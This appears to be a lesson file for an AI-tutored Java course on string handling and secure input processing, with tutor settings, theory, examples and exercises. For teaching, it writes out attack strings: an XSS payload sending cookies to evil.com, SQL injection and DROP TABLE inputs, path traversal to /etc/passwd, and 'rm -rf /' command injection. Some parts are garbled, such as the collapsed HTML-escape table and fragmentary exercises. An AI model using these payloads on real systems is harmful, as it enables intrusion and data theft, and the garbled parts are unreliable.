title: Strings & Text Security
description: Master Java String manipulation, formatting, validation, and secure text handling to prevent injection and data leaks.
learning_outcomes: Create, compare, and manipulate strings using built-in methods
Understand String immutability and the string pool
Use StringBuilder for efficient string building
Format strings with printf and String.format
Split, join, and parse text data
Validate user input with string methods and regular expressions
Sanitise input to prevent injection attacks
Understand why == fails for string comparison and use equals correctly
Apply security-first thinking to all text handling

ai_tutor_config.personality: Encouraging, patient, uses real-world analogies. Never judges. Celebrates small wins. Explains strings like everyday text messages, letters, and forms.

intervention_triggers.idle_40_seconds: Hey, still with me? Strings are everywhere in programming -- every username, password, message, and URL is a string. If something feels confusing, just ask! I love explaining things with text message analogies.
intervention_triggers.idle_90_seconds: Taking a moment to think is perfectly fine! Strings have a LOT of methods. You do not need to memorise them all -- just know the common ones: length(), charAt(), substring(), equals(), contains(). Want me to give you a quick cheat sheet?
intervention_triggers.idle_180_seconds: No rush at all! String security is one of those topics that makes you a much better developer. Take a short break if you need one -- when you come back I will recap exactly where you left off and we will tackle it together.
intervention_triggers.first_error: Nice try! String errors are super common. The biggest trap is using == instead of .equals() for comparison. Let me show you exactly what went wrong and why.
intervention_triggers.repeated_errors: I can see this one is tricky. Let me try a different approach. Think of a String like a text message on your phone -- once sent, you cannot edit it. Every 'change' creates a new message. Want me to walk through it step by step?
intervention_triggers.after_success: Brilliant! String handling is one of the most practical skills in programming. Every web form, every API, every database query uses strings. You are building real security skills!

encouragement_phrases: Every website login you have ever used relies on string handling -- you are learning essential skills!
String security prevents real attacks. You are thinking like a security professional now!
The difference between == and .equals() trips up even experienced developers. Great job understanding it!
StringBuilder might seem small but it is used in every high-performance Java application.
Input validation is the FIRST line of defence. You are building that skill right now!
Regular expressions are like a superpower -- hard to learn, incredibly useful once you do.
You are moving from coding to SECURE coding. That is a big step forward!
Every exercise you complete makes your code more secure. Keep going!
Professional developers spend a LOT of time on string handling. You are building real expertise.
The fact that you are learning about injection prevention shows real security awareness.

explanation_styles.analogy: A String is like a text message -- once sent, it cannot be changed. If you want to 'edit' it, you actually create a new message. StringBuilder is like a draft message you can edit before sending.
explanation_styles.visual: String pool: imagine a library. 'Hello' is one book. Every variable pointing to 'Hello' shares the SAME book. Creating new String('Hello') buys a private copy nobody shares.
explanation_styles.step_by_step: Step 1: Create string. Step 2: Never use == for comparison, use .equals(). Step 3: Validate input before using it. Step 4: Sanitise to remove dangerous characters. Step 5: Use parameterised queries for databases.
explanation_styles.code_trace: String s = 'Hello'; s = s + ' World'; -- Line 1 creates 'Hello' in pool. Line 2 creates NEW string 'Hello World'. Original 'Hello' still exists in memory. s now points to new string.
explanation_styles.comparison: String = immutable (cannot change). StringBuilder = mutable (can modify in place). char[] = raw characters. String is safest but slowest for building. StringBuilder is fastest for building.

theory.introduction:
Strings are the most common data type in programming. Every username, password, email, URL, message, file path, and database query is a string. If you build any application -- web, mobile, desktop -- you will spend a LOT of time working with strings.

But here is the twist: strings are also the NUMBER ONE attack surface in software security. SQL injection, cross-site scripting (XSS), path traversal, command injection -- they ALL exploit string handling mistakes. A single unvalidated string from a user can crash your server, steal your database, or take over accounts.

This topic teaches you both sides: how to USE strings effectively (manipulation, formatting, parsing) and how to PROTECT your application (validation, sanitisation, secure comparison). By the end, you will think about every piece of text as both useful data AND a potential threat.

Think of strings like letters arriving at your front door. Most are genuine -- bills, cards from friends, newsletters. But some might be scams trying to trick you into giving away your bank details. You need to read them (string manipulation) AND check them carefully (string security).
theory.why_important: String vulnerabilities cause more real-world breaches than almost any other bug type. The OWASP Top 10 lists injection as one of the most critical web application security risks. Every input field on every website is a potential entry point for attackers. Learning secure string handling is not optional -- it is essential for any developer who writes code that touches user input, which is virtually every developer.

key_concepts.explanation:
In Java, strings are IMMUTABLE -- once created, they cannot be changed. Every operation that seems to change a string actually creates a NEW string.

Think of it like a printed book. You cannot edit a printed page. To make changes, you print a new page. The old one still exists until garbage collection removes it.

Two ways to create strings:
- String literal: String s = "Hello"; (uses string pool, efficient)
- new keyword: String s = new String("Hello"); (creates new object, wastes memory)

Always use literals unless you have a specific reason for new.
key_concepts.example:
String s1 = "Hello";           // string pool
String s2 = "Hello";           // same object as s1!
String s3 = new String("Hello"); // different object

System.out.println(s1 == s2);      // true (same pool object)
System.out.println(s1 == s3);      // false (different objects!)
System.out.println(s1.equals(s3)); // true (same content)

// Immutability demo
String greeting = "Hello";
greeting.toUpperCase();  // returns "HELLO" but greeting is STILL "Hello"
greeting = greeting.toUpperCase();  // NOW greeting is "HELLO" (new string assigned)
key_concepts.ai_hint: GOLDEN RULE: Always use .equals() to compare string CONTENT. == compares memory addresses.

key_concepts.explanation:
This is the MOST COMMON Java mistake:
- == checks if two variables point to the SAME OBJECT in memory
- .equals() checks if two strings have the SAME CONTENT

Think of identical twins. They LOOK the same (equals) but they are DIFFERENT people (==). You almost always want .equals().

Also use .equalsIgnoreCase() for case-insensitive comparison. For security, use constant.equals(variable) not variable.equals(constant) to avoid NullPointerException.
key_concepts.ai_hint: Put the KNOWN string first: 'admin'.equals(input) is safer than input.equals('admin') because input might be null.

key_concepts.explanation:
Java strings have dozens of built-in methods. The most important ones:

length() -- character count
charAt(i) -- character at position
substring(start, end) -- extract portion
toUpperCase() / toLowerCase() -- case conversion
trim() -- remove leading/trailing whitespace
contains(str) -- check if substring exists
startsWith(str) / endsWith(str) -- check prefix/suffix
indexOf(str) -- find position (-1 if not found)
replace(old, new) -- replace all occurrences
isEmpty() -- true if length is 0

All return NEW strings (immutability!).
key_concepts.example:
String text = "  Hello, World!  ";

System.out.println(text.length());         // 17 (includes spaces)
System.out.println(text.trim());           // "Hello, World!"
System.out.println(text.trim().length());  // 13
System.out.println(text.charAt(2));        // 'H' (index 2)
System.out.println(text.contains("World")); // true
System.out.println(text.indexOf("World")); // 9
System.out.println(text.toUpperCase());    // "  HELLO, WORLD!  "
System.out.println(text.replace("World", "Java")); // "  Hello, Java!  "
System.out.println(text.startsWith("  H")); // true
key_concepts.ai_hint: All these methods return a NEW string. The original text is NEVER modified (immutability).

key_concepts.explanation:
substring(start) returns from start to end of string.
substring(start, end) returns from start to end-1.

Think of it like cutting a ribbon. You specify where to start cutting and where to stop. The end index is EXCLUSIVE (not included).

Common use: extract domain from email, get file extension, parse CSV fields.
key_concepts.ai_hint: substring(0, 5) gives characters at index 0,1,2,3,4. The end index (5) is NOT included.

key_concepts.explanation:
split(delimiter) breaks a string into an array of parts.
String.join(delimiter, array) combines parts back into one string.

Think of split like cutting a pizza along the lines. Join is putting slices back together.

Critical for: parsing CSV files, processing URLs, handling user input, reading log files.
key_concepts.ai_hint: split takes a REGEX pattern. To split on . use split('\\.') because . means 'any character' in regex.

key_concepts.explanation:
Every time you concatenate with +, Java creates a new String object. In a loop, this wastes huge amounts of memory.

StringBuilder is a MUTABLE string. You can append, insert, delete without creating new objects each time.

Think of String like writing in ink (permanent). StringBuilder is like writing in pencil (erasable).

Rule of thumb: use + for simple concatenation. Use StringBuilder inside loops or when building large strings.
key_concepts.ai_hint: In a loop of 10,000 iterations, StringBuilder is 100x faster than String +. Always use it in loops.

key_concepts.explanation:
String.format() and System.out.printf() create formatted strings using placeholders:

%s = string, %d = integer, %f = float, %b = boolean
%.2f = float with 2 decimal places
%10s = right-align in 10 chars
%-10s = left-align in 10 chars
%n = newline (platform-independent)

Think of it like a template letter with blanks: 'Dear [NAME], your order [NUMBER] totals [PRICE].'
key_concepts.ai_hint: printf PRINTS directly. String.format RETURNS a string. Use format when you need to store the result.

key_concepts.concept: Input Validation -- The First Line of Defence
key_concepts.explanation:
NEVER trust user input. Every string from outside your program could be:
- Empty or null
- Too long (buffer overflow attempt)
- Contains special characters (injection attempt)
- Wrong format (not a valid email, number, etc.)

Validation means checking input BEFORE using it. Like a bouncer at a club checking IDs before letting people in.

Basic checks: not null, not empty, correct length, correct format, no dangerous characters.
key_concepts.ai_hint: Validate EARLY, validate STRICTLY. It is easier to reject bad input than to fix it later.

key_concepts.explanation:
Sanitisation means CLEANING input to remove or escape dangerous characters. Used AFTER validation as an extra safety layer.

Common sanitisation:
- Remove HTML tags to prevent XSS
- Escape single quotes to prevent SQL injection
- Remove path separators to prevent directory traversal
- Trim whitespace to prevent padding attacks

Think of sanitisation like going through airport security: remove your belt, empty your pockets, walk through the scanner.
key_concepts.ai_hint: Sanitisation is a SAFETY NET, not a replacement for validation. Always validate first, then sanitise.

key_concepts.explanation:
SQL injection is one of the most dangerous attacks. It works by inserting SQL commands into string input.

Example attack: username = "admin' OR '1'='1" turns a login query into one that always succeeds.

Prevention: NEVER build SQL queries by concatenating strings. Use parameterised queries (PreparedStatement) which separate code from data.

Think of it like a form with fixed fields. You can fill in the blanks but you cannot change the form structure.
key_concepts.ai_hint: The ? placeholder makes the database treat input as pure data, never as SQL code. This stops injection completely.

key_concepts.explanation:
XSS attacks inject JavaScript through input fields. When the text is displayed in a web page, the script runs in other users browsers.

Example attack: comment = '<script>document.location="http://evil.com/steal?"+document.cookie</script>'

Prevention: escape HTML special characters before displaying user content:
& becomes & < becomes < > becomes > ' becomes ' " becomes "

Think of XSS like someone putting a fake sign in a shop: customers trust the shop, so they follow the fake sign.
key_concepts.ai_hint: Order matters! Replace & FIRST, otherwise you double-encode the other replacements.

key_concepts.explanation:
Regular expressions (regex) define patterns for matching text. Like a search with wildcards on steroids.

Common patterns:
[a-z] = one lowercase letter
[0-9] or \\d = one digit
+ = one or more
* = zero or more
{3,5} = between 3 and 5 times
^ = start of string
$ = end of string

Use matches() for full string match. Use Pattern/Matcher for partial matching.
key_concepts.ai_hint: matches() checks the ENTIRE string. For partial matching use: Pattern.compile(regex).matcher(str).find().

complete_examples.title: Example 1: String Creation and Basics
complete_examples.description: Creating strings and using basic methods.
complete_examples.output:
Text: Hello, World!
Length: 13
Char at 0: H
Char at 7: W
Upper: HELLO, WORLD!
Lower: hello, world!
Trimmed: spaces
Empty: true
Empty: false
complete_examples.ai_explanation: length() counts all characters including spaces and punctuation. charAt(0) gives the first character. toUpperCase/toLowerCase return NEW strings. trim() removes leading and trailing whitespace. isEmpty() checks if length is 0.
complete_examples.ai_challenge: Try greeting.charAt(greeting.length() - 1) to get the last character.

complete_examples.title: Example 2: String Comparison -- The == Trap
complete_examples.description: Why == fails and equals() is essential.
complete_examples.output:
a == b: true
a == c: false
a.equals(b): true
a.equals(c): true
a.equals(d): false
a.equalsIgnoreCase(d): true
Safe check: false
complete_examples.ai_explanation: a==b is true because both use the string pool (same object). a==c is false because 'new' creates a separate object. equals() checks content, so a.equals(c) is true. Put the constant first to avoid NullPointerException.
complete_examples.ai_challenge: Never use == for string comparison in real code. Always use .equals() or .equalsIgnoreCase().

complete_examples.title: Example 3: Substring and IndexOf
complete_examples.description: Extract parts of strings and find positions.
complete_examples.output:
First /: 6
Last /: 30
Contains 'product': true
Protocol: https
Last segment: laptop
User: alice.smith
Domain: company.co.uk
complete_examples.ai_explanation: indexOf finds the first occurrence. lastIndexOf finds the last. substring(start, end) extracts -- end is EXCLUSIVE. These are the bread and butter of text parsing.
complete_examples.ai_challenge: Extract the domain extension (co.uk) from the email.

complete_examples.title: Example 4: Split and Join
complete_examples.description: Break strings apart and reassemble them.
complete_examples.output:
Name: Alice
Age: 25
City: London
Job: Engineer
Level: ERROR
Date: 2024-01-15
Message: Connection timeout:retry in 5s
Java is powerful
A | B | C
complete_examples.ai_explanation: split(",") divides at every comma. split(":", 3) limits to 3 parts -- the third part gets everything remaining. Join reconnects with a delimiter.
complete_examples.ai_challenge: Parse this log: '192.168.1.1 - GET /index.html 200' into IP, method, path, status.

complete_examples.title: Example 5: StringBuilder in Action
complete_examples.output:
=== REPORT ===
1. Laptop       $999.99
2. Mouse        $29.99
3. Keyboard     $79.99

Total: $1109.97
dlroW ,iH
complete_examples.ai_explanation: StringBuilder.append() modifies in place -- no new objects created. In a loop of 1000 items, this is 100x faster than string + concatenation. Use toString() to get the final String.
complete_examples.ai_challenge: Build an HTML table using StringBuilder with 5 rows of data.

complete_examples.title: Example 6: String Formatting
complete_examples.description: printf and String.format for professional output.
complete_examples.ai_explanation: %-15s left-aligns in 15 chars. %5d right-aligns integer in 5 chars. %10.2f right-aligns decimal with 2 places in 10 chars. printf prints directly. String.format returns a String.
complete_examples.ai_challenge: Create a receipt with items, quantities, prices, and a total line.

complete_examples.title: Example 7: Input Validation
complete_examples.description: Complete input validation for username, email, and password.
complete_examples.output:
Username 'alice_99': true
Username 'ab': false
Username '<script>': false
Email 'a@b.com': true
Email 'invalid': false
Password 'Str0ng!x': true
Password 'weak': false
complete_examples.ai_explanation: Three layers: null check, length check, format check. Username allows only safe characters. Email must have @ and domain. Password requires uppercase, lowercase, digit, and special character.
complete_examples.ai_challenge: Add a phone number validator that accepts formats like 07700-123456 or +44 7700 123456.

complete_examples.title: Example 8: HTML Sanitisation
complete_examples.description: Strip dangerous HTML to prevent cross-site scripting (XSS).
complete_examples.ai_explanation: escapeHtml converts dangerous characters to safe HTML entities -- the browser shows them as TEXT, not executable code. stripTags removes all HTML tags entirely. Escape when you want to SHOW the text. Strip when you want to REMOVE all formatting.

complete_examples.title: Example 9: SQL Injection Demo
complete_examples.description: Shows how string concatenation enables SQL injection.
complete_examples.output:
Normal:
SELECT * FROM users WHERE name = 'alice'

ATTACK (unsafe):
SELECT * FROM users WHERE name = 'admin' OR '1'='1'
This returns ALL users!

ATTACK (escaped):
SELECT * FROM users WHERE name = 'admin'' OR ''1''=''1'
This searches for literal text.

DROP TABLE (unsafe):
SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
complete_examples.ai_explanation: The unsafe version lets the attacker close the quote and inject SQL. The escaped version doubles quotes so they become literal text. In real code, ALWAYS use PreparedStatement -- manual escaping is error-prone.
complete_examples.ai_challenge: What happens with attack string: admin' UNION SELECT password FROM users --

complete_examples.title: Example 10: Path Traversal Prevention
complete_examples.description: Prevent directory traversal attacks in file paths.
complete_examples.output:
report.pdf
etcpasswd
windowssystem32
default.txt
default.txt
default.txt
complete_examples.ai_explanation: Path traversal uses ../ to escape the intended directory. Attackers try to read /etc/passwd or system files. Our sanitiser strips path separators, parent references, and validates allowed characters.

complete_examples.title: Example 11: Regular Expression Validation
complete_examples.description: Use regex patterns for robust input validation.
complete_examples.output:
alice@co.com           VALID
bad@                   INVALID
@no.com                INVALID
test@x.uk              VALID
spaces in@email.com    INVALID

EH1 1AB    VALID
SW1A 1AA   VALID
12345      INVALID
INVALID    INVALID

normal          OK
<script>        BLOCKED
admin' OR       BLOCKED
DROP TABLE      BLOCKED
complete_examples.ai_explanation: matches() checks the entire string. [a-zA-Z0-9]+ means one or more letters/digits. {2,} means at least 2. The danger detector catches common attack patterns. In production, use established security libraries.
complete_examples.ai_challenge: Write a regex for UK phone numbers: 07xxx xxxxxx or +44 7xxx xxxxxx.

complete_examples.title: Example 12: Character-Level Processing
complete_examples.description: Process strings character by character for analysis.
complete_examples.output:
Text: Hello World 123! @#$
Uppercase: 2
Lowercase: 8
Digits: 3
Spaces: 3
Special: 4
Total: 20
Reversed: $#@ !321 dlroW olleH
racecar is palindrome: true
complete_examples.ai_explanation: toCharArray() converts to char array for iteration. Character class has isUpperCase, isLowerCase, isDigit, isLetter, isLetterOrDigit -- all useful for validation.
complete_examples.ai_challenge: Count vowels vs consonants in a sentence.

complete_examples.title: Example 13: Secure Password Handling
complete_examples.description: Hash passwords, never store in plain text.
complete_examples.output:
Stored hashes:
alice: 2c26b46b68ffc68f...
bob: 3c9c43e6a7eb7c4f...

Login alice: true
Login wrong: false
complete_examples.ai_explanation: NEVER store passwords as plain text. SHA-256 hashes the password into a fixed-length hex string. Same input always gives same hash, but you cannot reverse a hash back to the password. In production, use bcrypt or Argon2 with salting.
complete_examples.ai_challenge: What happens if two users have the same password? (Hint: look into password salting)

complete_examples.title: Example 14: Complete Input Processing Pipeline
complete_examples.description: Full security pipeline: validate, sanitise, process, escape output.
complete_examples.output:
--- Input: Hello World ---
Clean: Hello World
Words: 2
Display: Hello World

--- Input: <script>alert('XSS')</script> ---
Clean: alert(XSS)
Words: 1
Display: alert(XSS)

--- Input: admin' OR '1'='1 ---
Clean: admin OR 1=1
Words: 3
Display: admin OR 1=1

--- Input: null ---
REJECTED

--- Input:  ---
REJECTED
complete_examples.ai_explanation: The 4-step pipeline: (1) Validate rejects obviously bad input. (2) Sanitise removes dangerous characters. (3) Process the clean data. (4) Escape before displaying. This defence-in-depth approach means even if one layer fails, others catch the attack.
complete_examples.ai_challenge: Add rate limiting: reject if the same user submits more than 5 inputs per minute.

visual_diagram.title: String Security Pipeline -- From Input to Safe Output
visual_diagram.content: STRING SECURITY PIPELINE [USER INPUT ARRIVES] | v STEP 1: VALIDATE - Is it null or empty? --> REJECT - Is it too long? --> REJECT - Wrong format? --> REJECT - Looks valid --> continue | v STEP 2: SANITISE - Strip HTML tags (prevent XSS) - Escape quotes (prevent SQL injection) - Remove path chars (prevent traversal) - Trim whitespace (prevent padding) | v STEP 3: PROCESS - Parse, split, transform - Use PreparedStatement for SQL - Business logic on clean data | v STEP 4: ESCAPE OUTPUT - HTML encode for web pages - JSON encode for APIs - URL encode for links [STRING COMPARISON] WRONG: if (str1 == str2) -- compares MEMORY ADDRESS RIGHT: if (str1.equals(str2)) -- compares CONTENT SAFE: if ("admin".equals(str)) -- null-safe pattern CASE: str1.equalsIgnoreCase(str2) [STRING vs STRINGBUILDER] String StringBuilder Immutable Mutable + creates new object append() modifies in place Simple concatenation Loops and large strings Thread-safe NOT thread-safe (fast) [COMMON ATTACKS] SQL Injection: admin' OR '1'='1 Prevention: PreparedStatement with ? placeholders XSS: <script>alert('hack')</script> Prevention: Escape < > & ' " before display Path Traversal: ../../../etc/passwd Prevention: Strip / \ .. from filenames Command Inject: ; rm -rf / Prevention: Never pass user input to system commands [REMEMBER] 1. .equals() not == for string comparison 2. Strings are immutable -- every change creates new object 3. StringBuilder for loops and large string building 4. NEVER trust user input -- validate then sanitise 5. Use PreparedStatement for SQL, never concatenation 6. Escape HTML output to prevent XSS 7. Regex for pattern validation: matches("[a-zA-Z0-9]+") 8. Hash passwords with SHA-256 or better (bcrypt)

practice_exercises.title: Exercise 1: String Length and charAt
practice_exercises.description: Get the length and specific characters from a string.
practice_exercises.ai_intro: Every string knows its own length and what character is at each position!
practice_exercises.expected_output:
Length: 11
First: P
Last: g
Middle: a

hints.message: word.length() gives the count. word.charAt(0) gives first.

practice_exercises.title: Exercise 2: toUpperCase and toLowerCase
practice_exercises.description: Convert text to different cases.
practice_exercises.ai_intro: Case conversion is essential for case-insensitive comparison.
practice_exercises.expected_output:
Upper: HELLO WORLD
Lower: hello world
Equals (ignore case): true

practice_exercises.title: Exercise 3: Predict -- equals vs ==
practice_exercises.description: What does each comparison return?
practice_exercises.ai_intro: This is the most important String concept to understand.
practice_exercises.expected_output:
true
false
true
false
true

hints.message: a==b: both from pool, same object. a==c: c is new object.
a.equals(c): same content. a.equals(d): different case. equalsIgnoreCase: ignores case.

practice_exercises.title: Exercise 4: trim and isEmpty
practice_exercises.description: Clean and check strings.
practice_exercises.ai_intro: User input often has extra spaces. trim() cleans them.
practice_exercises.expected_output:
'  Hello  ' trimmed: 'Hello', empty: false
'   ' trimmed: '', empty: true
'' trimmed: '', empty: true

hints.message: input1.trim() removes spaces. input1.trim().isEmpty() checks if result is empty.

String t=input1.trim(); System.out.println("'"+input1+"' trimmed: '"+t+"', empty: "+t.isEmpty());
// Repeat for input2 and input3

practice_exercises.title: Exercise 5: contains, startsWith, endsWith
practice_exercises.description: Search within strings.
practice_exercises.ai_intro: These are your string search tools.
practice_exercises.expected_output:
Contains 'example': true
Starts with 'https': true
Ends with 'products': true
Contains 'http://': false

practice_exercises.title: Exercise 6: indexOf and lastIndexOf
practice_exercises.description: Find positions of characters and substrings.
practice_exercises.ai_intro: indexOf finds first match, lastIndexOf finds last.
practice_exercises.expected_output:
First /: 0
Last /: 20
Last .: 33
Filename: report.final.pdf
Extension: pdf

practice_exercises.title: Exercise 7: substring Extraction
practice_exercises.description: Extract specific parts from strings.
practice_exercises.ai_intro: substring(start, end) -- end is EXCLUSIVE.
practice_exercises.expected_output:
Year: 2024
Month: 01
Day: 15
Card ending: 9876

hints.message: date.substring(5, 7) gives month. date.substring(8) gives day.

practice_exercises.title: Exercise 8: replace and replaceAll
practice_exercises.description: Replace characters and patterns in strings.
practice_exercises.ai_intro: replace for exact text, replaceAll for regex patterns.
practice_exercises.expected_output:
Clean: Hello.   World.   Java.
Spaces fixed: Hello. World. Java.
Censored: The password is ***

hints.message: result.replaceAll("\\s+", " ") replaces one or more spaces with single space.

practice_exercises.title: Exercise 9: Immutability Proof
practice_exercises.description: Show that string methods create NEW strings.
practice_exercises.ai_intro: The original string NEVER changes.
practice_exercises.expected_output:
Original: Hello
Upper: HELLO
Replaced: Jello

hints.message: original is still "Hello" because strings are immutable.
original.toLowerCase() returns a new string but nobody captures it.

practice_exercises.title: Exercise 10: String Conversion
practice_exercises.description: Convert between String and other types.
practice_exercises.ai_intro: String.valueOf() converts anything to String. Parse methods go back.
practice_exercises.expected_output:
Int to String: '42'
Double to String: '3.14159'
Bool to String: 'true'
String to int: 123
String to double: 45.67
Sum: 168.67

practice_exercises.title: Exercise 11: First StringBuilder
practice_exercises.description: Build a greeting with StringBuilder.
practice_exercises.ai_intro: StringBuilder lets you build strings piece by piece.
practice_exercises.expected_output: Hello, Alice! Welcome to Java.

practice_exercises.title: Exercise 12: StringBuilder in Loop
practice_exercises.description: Build a number sequence efficiently.
practice_exercises.ai_intro: Using + in a loop is slow. StringBuilder is fast.

hints.message: StringBuilder sb = new StringBuilder(); for(int i=1;i<=10;i++) ...
Use a condition to not add comma after last number: if(i>1) sb.append(", ");

practice_exercises.title: Exercise 13: StringBuilder Methods
practice_exercises.description: insert, delete, replace, reverse.
practice_exercises.ai_intro: StringBuilder is mutable -- you can edit in place.
practice_exercises.expected_output:
Original: Hello World
Inserted: Hello, World
Replaced: Hello, Java
Reversed: avaJ ,olleH

practice_exercises.title: Exercise 14: printf Table
practice_exercises.description: Format a product table with printf.

practice_exercises.title: Exercise 20: Performance Comparison

practice_exercises.ai_intro: StringBuilder is dramatically faster for loops.

String +: ~50-200ms
StringBuilder: ~0-1ms
StringBuilder is many x faster

hints.message: StringBuilder sb=new StringBuilder(); for(int i=0;i<N;i++) sb.append("a");
String result = sb.toString(); -- converts at the end.

1: is
2: a

4: programming
5: language

Red | Green | Blue | Yellow
Red -> Green -> Blue -> Yellow

practice_exercises.description: Split config string into key=value pairs.

host = localhost
port = 8080
debug = true

hints.message: First split by ";" to get pairs.
Then split each pair by "=" to get key and value.

Sentences: 3

Path: /products/laptop

practice_exercises.description: Reverse the order of words in a sentence.
practice_exercises.ai_intro: Split, reverse array, join back.
practice_exercises.expected_output: Java from World Hello

hints.message: Loop backwards: for(int i=words.length-1; i>=0; i--)

practice_exercises.title: Exercise 28: Parse Log Entry
practice_exercises.description: Extract timestamp, level, and message from log.
practice_exercises.ai_intro: Use split with limit to handle messages containing the delimiter.
practice_exercises.expected_output:
Date: 2024-01-15
Time: 14:30:22
Level: ERROR
Message: Connection failed: timeout after 30s

hints.message: Split by space for first parts. Level is between [ and ].
int lStart=log.indexOf("[")+1; int lEnd=log.indexOf("]"); String level=log.substring(lStart,lEnd);

practice_exercises.title: Exercise 29: Title Case Converter
practice_exercises.description: Convert 'hello world' to 'Hello World'.
practice_exercises.ai_intro: Capitalise first letter of each word.

Hello World From Java
Already Upper

hints.message: Split into words. For each: first char uppercase + rest lowercase.

practice_exercises.description: Parse a structured multi-line text block.

Name:   Alice

practice_exercises.title: Exercise 31: Null and Empty Check
practice_exercises.description: Write a safe isEmpty check that handles null.
practice_exercises.ai_intro: Null check FIRST, then empty check.
practice_exercises.expected_output:
true
false
false
false

hints.message: Check null FIRST: if(input == null) return false;

practice_exercises.title: Exercise 32: Length Validation
practice_exercises.description: Check if input is within min/max length.
practice_exercises.ai_intro: Too short or too long = rejected.
practice_exercises.expected_output:
true
false
false

hints.message: static boolean isValidLength(String input,int min,int max){return input!=null && input.length()>=min && input.length()<=max;}

practice_exercises.title: Exercise 33: Username Validator
practice_exercises.description: Only letters, numbers, and underscore allowed.
practice_exercises.ai_intro: Use matches() with regex for character validation.
practice_exercises.expected_output:
true
false
false
false
false

hints.message: Check null, then length, then pattern.
static boolean isValidUsername(String u){if(u==null)return false;if(u.length()<3||u.length()>20)return false;return u.matches("[a-zA-Z0-9_]+");}

practice_exercises.title: Exercise 34: Email Validator
practice_exercises.description: Basic email format validation.
practice_exercises.ai_intro: Must have @, domain, and extension.
practice_exercises.expected_output:
true
true
false
false
false

hints.message: static boolean isValidEmail(String e){if(e==null||!e.contains("@"))return false;String[] p=e.split("@");if(p.length!=2||p[0].isEmpty())return false;return p[1].contains(".")&&p[1].length()>3;}

practice_exercises.title: Exercise 35: Password Strength Checker
practice_exercises.description: Check for uppercase, lowercase, digit, special char.
practice_exercises.ai_intro: Loop through each character and check its category.
practice_exercises.expected_output:
STRONG
MEDIUM
WEAK

hints.message: Count categories: boolean hasUpper, hasLower, hasDigit, hasSpecial.

practice_exercises.title: Exercise 36: Validate Integer Input
practice_exercises.description: Check if a string is a valid integer before parsing.
practice_exercises.ai_intro: parseInt throws NumberFormatException on bad input.
practice_exercises.expected_output:
true
true
false
false
false
false

hints.message: static boolean isInteger(String s){if(s==null||s.isEmpty())return false;try{Integer.parseInt(s);return true;}catch(NumberFormatException e){return false;}}

practice_exercises.title: Exercise 37: Phone Number Validator
practice_exercises.description: Accept multiple UK phone formats.
practice_exercises.ai_intro: Normalise first, then validate.
practice_exercises.expected_output:
true
true
true
false
false

hints.message: First normalise: remove spaces, dashes, and replace +44 with 0.
static boolean isValidUKPhone(String p){if(p==null)return false;String c=p.replaceAll("[\\s-]","").replace("+44","0");return c.matches("0\\d{10}");}

practice_exercises.title: Exercise 38: Whitelist Characters
practice_exercises.description: Allow only specific characters in input.
practice_exercises.ai_intro: Whitelist is safer than blacklist.
practice_exercises.expected_output:
Hello123
adminscript

hints.message: Loop each character. If allowed.contains(String.valueOf(c)), keep it.
StringBuilder sb=new StringBuilder(); for(char c:input.toCharArray()) if(allowed.indexOf(c)>=0) sb.append(c);
static String whitelistOnly(String input,String allowed){StringBuilder sb=new StringBuilder();for(char c:input.toCharArray())if(allowed.indexOf(c)>=0)sb.append(c);return sb.toString();}

practice_exercises.title: Exercise 39: Regex Pattern Matching
practice_exercises.description: Use matches() for multiple validation patterns.
practice_exercises.ai_intro: Regex is the most powerful validation tool.
practice_exercises.expected_output:
AB12 3CD -> VALID
12345 -> INVALID
abc -> INVALID
SW1A 1AA -> VALID
INVALID! -> INVALID

practice_exercises.title: Exercise 40: Complete Form Validator
practice_exercises.description: Validate name, email, age, and phone together.

=== Form 1 ===
Name: VALID
Email: VALID
Age: VALID
Phone: VALID
Result: ACCEPTED
=== Form 2 ===
Name: INVALID
Email: INVALID
Age: INVALID
Phone: INVALID
Result: REJECTED

hints.message: validEmail: contains @, has domain with dot.
validPhone: normalise then check 11 digits starting with 0.

practice_exercises.title: Exercise 41: Strip HTML Tags
practice_exercises.description: Remove all HTML tags from input.
practice_exercises.ai_intro: replaceAll with regex removes HTML.
practice_exercises.expected_output:

alert('XSS')
No tags here

practice_exercises.title: Exercise 42: Escape HTML Entities
practice_exercises.description: Convert < > & ' " to safe HTML entities.
practice_exercises.ai_intro: Order matters: escape & FIRST to avoid double-encoding.
practice_exercises.expected_output:
<script>alert('hi')</script>
5 > 3 && 2 < 4

practice_exercises.title: Exercise 43: SQL Injection Simulation
practice_exercises.description: Show how string concatenation enables injection.
practice_exercises.ai_intro: This is how real attacks work!
practice_exercises.expected_output:
Normal:
SELECT * FROM users WHERE name = 'alice'

Attack 1:
SELECT * FROM users WHERE name = 'admin' OR '1'='1'

Attack 2:
SELECT * FROM users WHERE name = ''; DROP TABLE users; --'

Safe:
SELECT * FROM users WHERE name = 'admin'' OR ''1''=''1'

hints.message: static String safeQuery(String user){return "SELECT * FROM users WHERE name = '"+user.replace("'","''")+"'";}
Doubling single quotes makes them literal text, not SQL terminators.
In real code: ALWAYS use PreparedStatement with ? parameters. Manual escaping is error-prone.

practice_exercises.title: Exercise 44: Path Traversal Prevention
practice_exercises.description: Sanitise filenames to prevent directory traversal.
practice_exercises.ai_intro: ../ is the attacker's best friend for reading files.
practice_exercises.expected_output:
report.pdf
default.txt
default.txt
default.txt

hints.message: Remove /, \, and .. first. Then validate with regex.

practice_exercises.title: Exercise 45: Command Injection Prevention
practice_exercises.description: Sanitise input that might be used in system commands.
practice_exercises.ai_intro: Never pass raw user input to system commands.
practice_exercises.expected_output:
myfile.txt
file rm -rf 
(cat /etc/passwd)
file  mail hacker@evil

hints.message: Use replaceAll to remove dangerous shell characters.

practice_exercises.title: Exercise 46: Detect Attack Patterns
practice_exercises.description: Scan input for common attack signatures.
practice_exercises.ai_intro: Pattern detection as an early warning system.
practice_exercises.expected_output:
SAFE
SQL_INJECTION
XSS
PATH_TRAVERSAL
SQL_INJECTION

hints.message: Check for SQL keywords: UNION, SELECT, DROP, OR '

practice_exercises.title: Exercise 47: Constant-Time String Comparison
practice_exercises.description: Prevent timing attacks on password comparison.
practice_exercises.ai_intro: Regular equals returns fast on first wrong char. Timing attack!
practice_exercises.expected_output:
true
false
false

hints.message: If lengths differ, still process all chars (pad shorter).

static boolean safeCompare(String a,String b){if(a==null||b==null)return false;int result=a.length()^b.length();int max=Math.max(a.length(),b.length());for(int i=0;i<max;i++){char ca=i<a.length()?a.charAt(i):0;char cb=i<b.length()?b.charAt(i):0;result|=ca^cb;}return result==0;}

practice_exercises.title: Exercise 48: Input Length Limiting
practice_exercises.description: Prevent buffer overflow with length limits.
